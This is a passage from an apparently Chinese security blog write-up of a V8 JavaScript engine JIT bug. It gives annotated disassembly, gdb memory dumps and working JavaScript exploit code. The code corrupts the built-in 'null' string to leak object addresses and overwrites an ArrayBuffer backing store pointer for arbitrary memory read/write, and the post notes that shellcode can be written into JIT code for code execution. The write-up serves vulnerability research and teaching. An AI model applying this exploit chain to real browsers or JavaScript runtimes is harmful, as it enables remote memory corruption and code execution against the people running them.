class="line"> - dependent code: 0x2089c5182241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc8    72  c5fb114007     vmovsd [rax+0x7],xmm0 &#x2F;&#x2F;重新赋值，破坏了initial_string map的结构，于是在后面ParseInt字符串的时候会crash</span><br><span class="line">...</span><br><span class="line">对比一下赋值前后</span><br><span class="line">前:</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x7f3e4882361-1</span><br><span class="line">0x7f3e4882360:0x000007f3e48822590x0019000400007300</span><br><span class="line">0x7f3e4882370:0x00000000082003ff0x00002089c5182201</span><br><span class="line">后:</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x7f3e4882361-1</span><br><span class="line">0x7f3e4882360:0x000007f3e48822590x41e04d0a5e800000--&gt;破坏了map结构</span><br><span class="line">0x7f3e4882370:0x00000000082003ff0x00002089c5182201</span><br><span class="line">...</span><br><span class="line">0x35680eb86ccd    77  49ba112330abf6000000 REX.W movq r10,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86cd7    87  4152           push r10</span><br><span class="line">0x35680eb86cd9    89  49ba39b062be00370000 REX.W movq r10,0x3700be62b039    ;; object: 0x3700be62b039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="line">0x35680eb86ce3    99  4152           push r10</span><br><span class="line">0x35680eb86ce5   101  48bf51d860be00370000 REX.W movq rdi,0x3700be60d851    ;; object: 0x3700be60d851 &lt;JS Function parseInt (SharedFunctionInfo 0xf6ab33ce11)&gt;</span><br><span class="line">0x35680eb86cef   111  488b75e8       REX.W movq rsi,[rbp-0x18]</span><br><span class="line">0x35680eb86cf3   115  488b7727       REX.W movq rsi,[rdi+0x27]</span><br><span class="line">0x35680eb86cf7   119  498b55a0       REX.W movq rdx,[r13-0x60]</span><br><span class="line">0x35680eb86cfb   123  b801000000     movl rax,0x1</span><br><span class="line">0x35680eb86d00   128  bb02000000     movl rbx,0x2</span><br><span class="line">0x35680eb86d05   133  e8f6eeefff     call ArgumentsAdaptorTrampoline  (0x35680ea85c00)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86d0a   138  48b8112330abf6000000 REX.W movq rax,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86d14   148  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x35680eb86d17   151  5d             pop rbp</span><br><span class="line">0x35680eb86d18   152  c20800         ret 0x8</span><br><span class="line">0x35680eb86d1b   155  90             nop</span><br></pre></td></tr></table></figure><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>据此，我们可以得出结论，在JIT优化之后，会直接从n中取出直接取出自定义属性数组中，对应于某属性偏移的字段，而不做任何合法性校验。</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n.xyz = <span class="number">3.4766863919133141e-308</span>;    <span class="comment">// do not modify string map </span></span><br><span class="line">    n.xyz1 = <span class="number">0x1821923f</span>                 <span class="comment">// do not modify hash value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>         <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">0x1c4269306d80     0  55             push rbp</span><br><span class="line">0x1c4269306d81     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x1c4269306d84     4  56             push rsi</span><br><span class="line">0x1c4269306d85     5  57             push rdi</span><br><span class="line">0x1c4269306d86     6  4883ec08       REX.W subq rsp,0x8</span><br><span class="line">0x1c4269306d8a    10  488b45f8       REX.W movq rax,[rbp-0x8]</span><br><span class="line">0x1c4269306d8e    14  488945e8       REX.W movq [rbp-0x18],rax</span><br><span class="line">0x1c4269306d92    18  488bf0         REX.W movq rsi,rax</span><br><span class="line">0x1c4269306d95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x1c4269306d9c    28  7305           jnc 35  (0x1c4269306da3)</span><br><span class="line">0x1c4269306d9e    30  e83dbbf5ff     call StackCheck  (0x1c42692628e0)    ;; code: BUILTIN</span><br><span class="line">0x1c4269306da3    35  48b8d9b9fadec60a0000 REX.W movq rax,0xac6defab9d9    ;; object: 0xac6defab9d9 PropertyCell for 0x3b0974d0a4b9 &lt;a Set with map 0x30613ee86509&gt;</span><br><span class="line">0x1c4269306dad    45  488b400f       REX.W movq rax,[rax+0xf] &#x2F;&#x2F;取出JSSet n</span><br><span class="line">0x1c4269306db1    49  49ba0064000004001900 REX.W movq r10,0x19000400006400</span><br><span class="line">0x1c4269306dbb    59  c4c1f96ec2     vmovq xmm0,r10</span><br><span class="line">0x1c4269306dc0    64  488b5807       REX.W movq rbx,[rax+0x7] &#x2F;&#x2F; 取n的自定义属性数组</span><br><span class="line">0x1c4269306dc4    68  488b5b0f       REX.W movq rbx,[rbx+0xf] &#x2F;&#x2F; 取n的xyz域，注意取域的时候，如果这个域代表的意义是一个整数值，就直接写入，如果代表的是一个指针，就要从指针再寻址写入。</span><br><span class="line">0x1c4269306dc8    72  c5fb114307     vmovsd [rbx+0x7],xmm0</span><br><span class="line">0x1c4269306dcd    77  488b5807       REX.W movq rbx,[rax+0x7] &#x2F;&#x2F; 取n的自定义属性数组</span><br><span class="line">0x1c4269306dd1    81  c7431b3f922118 movl [rbx+0x1b],0x1821923f &#x2F;&#x2F; 取n的xyz1域，注意这里要用一个整形数去完整替换，不然会变成一个HeapNum指针，而这个指针是可能访问到不能访问的内存，从而crash</span><br><span class="line">0x1c4269306dd8    88  488b4007       REX.W movq rax,[rax+0x7] &#x2F;&#x2F; 取n的自定义属性数组</span><br><span class="line">0x1c4269306ddc    92  c7402300700000 movl [rax+0x23],0x7000 &#x2F;&#x2F; 取n的xyz1域</span><br><span class="line">...</span><br><span class="line">最终</span><br><span class="line">gdb-peda$ x&#x2F;20gx $rax-1</span><br><span class="line">0x3067ec802240:0x000025b0e35823090x0000000000000000</span><br><span class="line">0x3067ec802250:0x000025b0e3582361-&gt;xyz0x1821923f-&gt;xyz1  803b1506</span><br><span class="line">0x3067ec802260:0x00007000-&gt;xyz2 000000000xdeadbeed6c6c756e</span><br><span class="line">...</span><br><span class="line">0x1c4269306de3    99  48b8112380ec67300000 REX.W movq rax,0x3067ec802311    ;; object: 0x3067ec802311 &lt;undefined&gt;</span><br><span class="line">0x1c4269306ded   109  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x1c4269306df0   112  5d             pop rbp</span><br><span class="line">0x1c4269306df1   113  c20800         ret 0x8</span><br></pre></td></tr></table></figure><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x2b753502250:0x00003182a4182361-&gt;null0x00000000803b1506</span><br><span class="line">0x2b753502260:0x00000004-&gt;length 000000000xdeadbeed 6c6c756e-&gt;&quot;null&quot;</span><br><span class="line">0x2b753502270:0x00003182a4182361-&gt;object0x00000000c5f6c42a</span><br><span class="line">0x2b753502280:0x0000000600000000-&gt;length0xdead 7463656a626f-&gt;&quot;object&quot;</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job 0x2b753502251</span><br><span class="line">#null</span><br><span class="line">gdb-peda$ job 0x2b753502271</span><br><span class="line">#object</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-12-092410.jpg" alt=""></p><h3 id="JSFunction"><a href="#JSFunction" class="headerlink" title="JSFunction"></a>JSFunction</h3><ul><li><p>表示JavaScript function的对象</p><ul><li>继承Object, HeapObject, JSReceiver, JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-141352.png" alt=""></li></ul></li></ul></li><li><p>实际演示</p><ul><li><p>存放function f()在数组中</p></li><li><p>用0xdeadbee查找这个数组的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142310.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142325.png" alt=""></p></li><li><p>kCodeEntryOffset is a pointer to the JIT code (RWX area), many strategies to realize arbitrary code execution by writing shellcode before this</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142516.png" alt=""></p></li></ul></li></ul><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><h4 id="ArrayBuffer-and-TypedArray"><a href="#ArrayBuffer-and-TypedArray" class="headerlink" title="ArrayBuffer and TypedArray"></a>ArrayBuffer and TypedArray</h4><ul><li>Originally ArrayBuffer<ul><li>一个可以直接从JavaScript访问内存的特殊数组<ul><li>但是，ArrayBuffer仅准备一个内存缓冲区</li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151055.png" alt=""></li><li>为了实际访问，有必要一起使用TypedArray或DataView<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151829.png" alt=""></li></ul></li><li>使用例子 (TypedArray版本)<ul><li>创建方法1，仅指定长度，初始化为零<br>t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部</li><li>创建方法2，使用特定值初始化<br>t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部</li><li>创建方法3，事先构建缓冲区并使用它<br>arr_buf = new ArrayBuffer(8);<br>t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组<br>t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置</li></ul></li><li>ArrayBuffer可以在不同的TypedArray之间共享<ul><li>它也可以用于double和int的类型转换<ul><li><strong>类型转换的意义在于改变字节序列的解释，而不是转换</strong></li><li>就像C语言的Union</li></ul></li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-153219.png" alt=""></li><li>①预先准备ArrayBuffer<br>var ab = new ArrayBuffer(0x100);</li><li>②向ArrayBuffer中写入一个Float64的值<br>var t64 = new Float64Array(ab);<br>t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef</li></ul>  <strong>–&gt;当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。 对于完成该转换，ArrayBuffer是最佳的</strong><ul><li>③从ArrayBuffer读取两个Uint32<br>var t32 = new Uint32Array(ab);<br>k = [t32[1],t32[0]]</li></ul>  <strong>–&gt;k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:</strong><br>  <strong>k=[0x00007fff，0xdeadbeef]</strong></li></ul></li></ul><h4 id="JSArrayBuffer-1"><a href="#JSArrayBuffer-1" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h4><ul><li>持有ArrayBuffer的对象<ul><li>继承Object，HeapObject，JSReceiver，JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-155703.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放TypedArray</li><li>使用长度0x13370搜索ArrayBuffer的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160126.png" alt=""></li><li>在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）<br>此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160917.png" alt=""></li><li>虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。</li><li>同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-162614.png" alt=""><h3 id="工具类准备"><a href="#工具类准备" class="headerlink" title="工具类准备"></a>工具类准备</h3>主要是用于double和int值的转换<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// int-&gt;double</span></span><br><span class="line"><span class="comment">// d2u(intaddr/0x100000000,intaddr&amp;0xffffffff)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// double-&gt;int</span></span><br><span class="line"><span class="comment">// u2d(floataddr)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="leak-ArrayBuffer和Function"><a href="#leak-ArrayBuffer和Function" class="headerlink" title="leak ArrayBuffer和Function"></a>leak ArrayBuffer和Function</h3></li></ul></li></ul><ol><li>触发漏洞，越界写null string的长度，写null string的value字段为obj</li><li>charCodeAt读出null string的value内容，从而leak出来<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> n;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object </span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">Ctor(); <span class="comment">// 初始化n</span></span><br><span class="line">Check(ab); <span class="comment">//写入ArrayBuffer到value字段</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/10gx 0x28767ae02240</span></span><br><span class="line"><span class="comment">// 0x28767ae02240:0x00000834750823090x0000000000000000</span></span><br><span class="line"><span class="comment">// 0x28767ae02250:0x00000834750823610x00000000803b1506</span></span><br><span class="line"><span class="comment">// 0x28767ae02260:0x00007000000000000x000004ea79906839-&gt;ArrayBuffer</span></span><br><span class="line"><span class="comment">// 0x28767ae02270:0x00000834750823610x00000000c5f6c42a</span></span><br><span class="line"><span class="comment">// 0x28767ae02280:0x00000006000000000xdead7463656a626f</span></span><br><span class="line"><span class="comment">// gdb-peda$ job 0x000004ea79906839</span></span><br><span class="line"><span class="comment">// 0x4ea79906839: [JSArrayBuffer]</span></span><br><span class="line"><span class="comment">//  - map = 0x3bcf5fc82db1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0xb3e9b805599</span></span><br><span class="line"><span class="comment">//  - elements = 0x28767ae02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - internal fields: 2</span></span><br><span class="line"><span class="comment">//  - backing_store = 0x55ba589d0640</span></span><br><span class="line"><span class="comment">//  - byte_length = 512</span></span><br><span class="line"><span class="comment">//  - properties = &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  - internal fields = &#123;</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">var</span> ab_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+ab_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>同理，leak出function<h3 id="写null-string的地址到它自己的value，从而可以通过写value来再次修改null-string"><a href="#写null-string的地址到它自己的value，从而可以通过写value来再次修改null-string" class="headerlink" title="写null string的地址到它自己的value，从而可以通过写value来再次修改null string"></a>写null string的地址到它自己的value，从而可以通过写value来再次修改null string</h3></li></ol><p><strong>这里为什么要这么做呢，原因其实在test里已经可以看到的，如果我们写一个smi到一个属性字段，当然可以直接写到该属性字段对应的偏移。</strong><br>也就是如图xyz1，我直接写入了一个0x1821923f的smi，注意smi最大是多少呢，在64位和32位有所不同。<br>在64位平台上V8对smi定义的范围是[-2³¹，2³¹-1]，即最大0x7fffffff，显然一个对象的地址会大于它，从而无法直接去写一个地址到该属性字段对应的偏移。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx $rax-1</span><br><span class="line">0x3067ec802240:0x000025b0e35823090x0000000000000000</span><br><span class="line">0x3067ec802250:0x000025b0e3582361-&gt;xyz0x1821923f-&gt;xyz1  803b1506</span><br><span class="line">0x3067ec802260:0x00007000-&gt;xyz2 000000000xdeadbeed6c6c756e</span><br></pre></td></tr></table></figure><p><strong>所以我们要写null string的地址到它自己的value，从而可以通过写value来再次修改null string。</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Check(<span class="built_in">String</span>(<span class="literal">null</span>));</span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx $rbx-1</span></span><br><span class="line"><span class="comment">// 0x3817fa502240:0x00003bd6a43823090x0000000000000000</span></span><br><span class="line"><span class="comment">// 0x3817fa502250:0x00003bd6a43823610x00000000803b1506</span></span><br><span class="line"><span class="comment">// 0x3817fa502260:0x00007000000000000x00003817fa502251-&gt;null string</span></span><br><span class="line"><span class="comment">// gdb-peda$ job 0x00003bd6a4382361</span></span><br><span class="line"><span class="comment">// 0x3bd6a4382361: [Map]</span></span><br><span class="line"><span class="comment">//  - type: ONE_BYTE_INTERNALIZED_STRING_TYPE</span></span><br><span class="line"><span class="comment">//  - instance size: 0</span></span><br><span class="line"><span class="comment">//  - elements kind: FAST_HOLEY_ELEMENTS</span></span><br><span class="line"><span class="comment">//  - unused property fields: 0</span></span><br><span class="line"><span class="comment">//  - enum length: invalid</span></span><br><span class="line"><span class="comment">//  - stable_map</span></span><br><span class="line"><span class="comment">//  - back pointer: 0x3817fa502311 &lt;undefined&gt;</span></span><br><span class="line"><span class="comment">//  - instance descriptors (own) #0: 0x3817fa502231 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - layout descriptor: 0</span></span><br><span class="line"><span class="comment">//  - prototype: 0x3817fa502201 &lt;null&gt;</span></span><br><span class="line"><span class="comment">//  - constructor: 0x3817fa502201 &lt;null&gt;</span></span><br><span class="line"><span class="comment">//  - code cache: 0x3817fa502241 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - dependent code: 0x3817fa502241 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - construction counter: 0</span></span><br></pre></td></tr></table></figure><h3 id="修改null-string的hash字段为ArrayBuffer的length地址"><a href="#修改null-string的hash字段为ArrayBuffer的length地址" class="headerlink" title="修改null string的hash字段为ArrayBuffer的length地址"></a>修改null string的hash字段为ArrayBuffer的length地址</h3><p>这里我再次提醒一下为什么要写入这个地址。<br>之前我们说了，如果写一个smi，可以直接写入，但是如果要写入的数值大于smi，会把该属性字段的值当成一个指针，然后将这个数值写入到那个内存里。<br>就比如，我向null string的map字段（对应于n.xyz)写一个非SMI进去.<br>double类型的3.4766863919152113e-308等于int类型的0x0019000400007300</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line"><span class="comment">// oob write empty_Fixed_Array, write object to null_str buffer</span></span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object addr</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x33e606b02241</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x33e606b02240</span>:<span class="number">0x0000081f59a02309</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33e606b02250</span>:<span class="number">0x0000081f59a02361</span>-&gt;n.xyz<span class="number">0x00000000803b1506</span></span><br><span class="line"><span class="number">0x33e606b02260</span>:<span class="number">0x0000700000000000</span><span class="number">0x000017f1e8c36fe96f</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x0000081f59a02361</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x81f59a02360</span>:<span class="number">0x0000081f59a02259</span><span class="number">0x0019000400007300</span>-&gt;被写入的<span class="number">3.4766863919152113e-308</span>即<span class="number">0x0019000400007300</span></span><br><span class="line"><span class="number">0x81f59a02370</span>:<span class="number">0x00000000082003ff</span><span class="number">0x000033e606b02201</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check2</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span></span><br><span class="line">m.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">m.xyz1 = <span class="number">0x0</span>                 <span class="comment">// do not modify the value</span></span><br><span class="line">m.xyz2 = <span class="number">0x7000</span> <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">m.xyz3 = addr</span><br><span class="line">&#125;</span><br><span class="line">Check2(ab_len_ptr_float);</span><br><span class="line"><span class="comment">// 0x3817fa502250:0x00003bd6a43823610x0000108ed87359d9-&gt;ArrayBuffer length的地址</span></span><br><span class="line"><span class="comment">// 0x3817fa502260:0x00007000000000000x00003817fa502251-&gt;null string</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x108ed87359c1-1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c0:0x00002d714c002db10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed87359d0:0x000037191c9822410x0000020000000000-&gt;length</span></span><br><span class="line"><span class="comment">// 0x108ed87359e0:0x000055ba589d0640-&gt;BackingStore</span></span><br></pre></td></tr></table></figure><p><strong>所以说为了写入一个地址到ArrayBuffer的BackingStore，首先将BackingStore向前减去8个字节的地址即length地址写入到hash字段。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073443.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073449.jpg" alt=""></p><h3 id="向null-string的hash字段写入任意值，得到任意地址读写的原语"><a href="#向null-string的hash字段写入任意值，得到任意地址读写的原语" class="headerlink" title="向null string的hash字段写入任意值，得到任意地址读写的原语"></a>向null string的hash字段写入任意值，得到任意地址读写的原语</h3><p>类似于我们上面写map一样，将[length_addr+0x8]即backingstore给覆盖成我们想要写入的内容。<br><strong>在v8里，只要你能修改backingstore的值，就可以进行任意地址读写</strong><br>于是就有了一个任意地址读写的原语。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073824.png" 